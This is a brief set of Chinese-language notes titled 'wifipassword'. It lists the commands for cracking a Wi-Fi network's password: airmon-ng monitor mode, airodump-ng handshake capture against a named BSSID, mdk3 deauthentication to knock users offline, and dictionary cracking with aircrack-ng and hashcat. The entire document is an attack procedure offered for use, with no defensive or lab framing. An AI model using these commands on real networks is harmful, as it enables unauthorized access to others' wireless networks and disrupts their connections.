# wifipassword
airmon-ng start wlp3s0 开启监听
airodump-ng wlp3s0mon扫描网络

airodump-ng -c 1 -w adc --bssid F8:8C:21:44:29:65 wlp3s0mon 抓包
airodump-ng -c <通道> -w <文件名> --bssid <mac地址> <网卡名>

与此同时新打开一个终端
mdk3 wlp3s0mon d -c 1 使用mdk3强制用户下线，开一会就关掉，否则别人连不上你也无法抓包

aircrack-ng -w 密码字典 <包含握手包的 cap 文件>  破解密码

aircrack-ng <out.cap> -J <out.hccap>转换文件

hashcat -m 2500 out.hccap.hccap  dics.txt破解密码
